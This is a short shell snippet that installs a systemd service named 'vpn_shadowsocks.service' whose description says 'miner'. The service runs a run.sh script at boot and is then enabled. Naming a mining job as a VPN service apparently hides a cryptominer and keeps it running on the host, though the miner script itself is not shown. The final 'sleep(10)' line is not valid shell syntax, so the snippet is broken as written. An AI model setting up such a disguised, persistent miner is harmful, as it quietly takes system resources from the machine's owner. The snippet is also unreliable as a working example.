cat > /usr/lib/systemd/system/vpn_shadowsocks.service <<EOF
[Unit]
Description=miner

[Service]
WorkingDirectory=$PWD
ExecStart=$PWD/run.sh

[Install]
WantedBy=multi-user.target
EOF
sleep(10) && systemctl enable	vpn_shadowsocks.service